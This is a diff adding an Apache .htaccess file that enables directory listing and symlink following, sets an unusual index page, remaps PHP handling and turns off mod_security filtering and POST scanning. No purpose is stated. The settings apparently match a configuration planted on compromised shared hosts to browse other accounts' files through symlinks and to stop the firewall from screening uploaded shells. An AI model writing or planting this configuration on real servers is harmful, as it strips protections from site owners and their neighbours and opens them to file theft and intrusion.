@@ -1,0 +1,14 @@
+Options Indexes FollowSymLinks
+DirectoryIndex ssssss.htm
+AddType txt .php
+AddHandler txt .php
+<Files *.php>
+ForceType application/x-httpd-php4
+</files>
+<IfModule mod_autoindex.c> 
+IndexOptions FancyIndexing IconsAreLinks SuppressHTMLPreamble 
+</ifModule>
+<IfModule mod_security.c> 
+SecFilterEngine Off 
+SecFilterScanPOST Off 
+</IfModule>
